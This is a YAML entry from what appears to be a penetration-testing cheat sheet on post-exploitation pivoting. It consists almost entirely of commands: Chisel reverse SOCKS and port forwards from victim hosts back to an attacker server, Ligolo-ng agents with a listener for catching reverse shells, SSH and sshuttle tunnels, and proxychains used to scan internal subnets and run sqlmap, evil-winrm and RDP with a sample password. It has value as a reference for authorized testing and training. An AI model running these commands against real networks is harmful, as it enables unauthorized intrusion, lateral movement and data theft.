---
description: |
  Pivot through compromised hosts using Chisel, Ligolo-ng, SSH tunneling, and proxychains to reach internal networks and forward ports.
command: |
  # Chisel — Reverse SOCKS Proxy
  # Start Chisel server on attacker:
  chisel server -p 8000 --reverse

  # Connect from Linux victim (SOCKS proxy on attacker at 127.0.0.1:1080):
  ./chisel client 10.10.10.21:8000 R:socks

  # Connect from Windows victim:
  chisel.exe client 10.10.10.21:8000 R:socks

  # Chisel with specific SOCKS port:
  chisel server -p 8000 --reverse
  ./chisel client 10.10.10.21:8000 R:9050:socks

  # Chisel port forward (single port, not SOCKS):
  # Forward remote port 3306 to attacker localhost:3306
  chisel server -p 8000 --reverse
  ./chisel client 10.10.10.21:8000 R:3306:127.0.0.1:3306

  # Chisel forward to internal host:
  # Access internal host 172.16.0.10:80 via attacker localhost:8080
  chisel server -p 8000 --reverse
  ./chisel client 10.10.10.21:8000 R:8080:172.16.0.10:80

  # Ligolo-ng — Full Tunnel (No SOCKS Needed)
  # Setup TUN interface on attacker (Linux only):
  sudo ip tuntap add user $(whoami) mode tun ligolo
  sudo ip link set ligolo up

  # Start Ligolo proxy on attacker:
  ./proxy -selfcert -laddr 0.0.0.0:11601

  # Connect agent from Linux victim:
  ./agent -connect 10.10.10.21:11601 -ignore-cert

  # Connect agent from Windows victim:
  agent.exe -connect 10.10.10.21:11601 -ignore-cert

  # In Ligolo proxy console — select session and start:
  >> session
  >> ifconfig
  >> start

  # Add route to internal network on attacker:
  sudo ip route add 172.16.0.0/24 dev ligolo

  # Add multiple routes:
  sudo ip route add 172.16.0.0/24 dev ligolo
  sudo ip route add 10.10.20.0/24 dev ligolo

  # Ligolo listener (receive reverse shell through tunnel):
  # In ligolo proxy console:
  >> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

  # SSH Local Port Forward
  # Access remote service on local port:
  ssh -L 8080:127.0.0.1:80 sec_user@10.10.10.27

  # Access internal host through pivot:
  ssh -L 8080:172.16.0.10:80 sec_user@10.10.10.27

  # Forward multiple ports:
  ssh -L 8080:172.16.0.10:80 -L 4443:172.16.0.10:443 sec_user@10.10.10.27

  # Background SSH tunnel (no shell):
  ssh -L 8080:127.0.0.1:80 -N -f sec_user@10.10.10.27

  # SSH Dynamic SOCKS Proxy
  # Create SOCKS proxy on local port 1080:
  ssh -D 1080 sec_user@10.10.10.27

  # Background SOCKS proxy:
  ssh -D 1080 -N -f sec_user@10.10.10.27

  # SSH Remote Port Forward
  # Expose attacker service through target (victim connects back):
  ssh -R 4444:localhost:4444 sec_user@10.10.10.27

  # Expose attacker web server through target:
  ssh -R 9000:localhost:80 sec_user@10.10.10.27

  # Proxychains Configuration
  # Edit /etc/proxychains4.conf:
  # Add at the end of /etc/proxychains4.conf:
  # Comment out proxy_dns if causing issues
  # Make sure to use the right type (socks4/socks5)
  socks5 127.0.0.1 1080

  # Proxychains with credentials:
  socks5 127.0.0.1 9090 sec_user P@ssw0rd

  # Using Proxychains
  # Nmap through proxy (must use -sT, TCP connect scan):
  proxychains4 nmap -sT -Pn -p 22,80,445,3389 172.16.0.10

  # NetExec through proxy:
  proxychains4 nxc smb 172.16.0.10
  proxychains4 nxc smb 172.16.0.0/24

  # Other tools through proxy:
  proxychains4 curl http://172.16.0.10
  proxychains4 sqlmap -u "http://172.16.0.10/page?id=1"
  proxychains4 evil-winrm -i 172.16.0.10 -u sec_user -p 'P@ssw0rd'
  proxychains4 ssh sec_user@172.16.0.10
  proxychains4 xfreerdp /v:172.16.0.10 /u:sec_user /p:'P@ssw0rd'

  # sshuttle (VPN over SSH)
  # Route all traffic to internal subnet through SSH:
  sshuttle -r sec_user@10.10.10.27 172.16.0.0/24

  # sshuttle with key:
  sshuttle -r sec_user@10.10.10.27 172.16.0.0/24 -e 'ssh -i id_rsa'

  # Common Pivoting Workflow
  # 1. Start chisel server on attacker
  chisel server -p 8000 --reverse
  # 2. Upload chisel to victim and connect
  ./chisel client 10.10.10.21:8000 R:socks
  # 3. Configure proxychains (/etc/proxychains4.conf)
  #    socks5 127.0.0.1 1080
  # 4. Scan internal network through proxy
  proxychains4 nmap -sT -Pn -p 22,80,445 172.16.0.0/24
  # 5. Use tools through proxy
  proxychains4 nxc smb 172.16.0.0/24
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - Linux
  - Windows
services: []
techniques: []
references:
  - https://github.com/jpillora/chisel
  - https://github.com/nicocha30/ligolo-ng
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
---
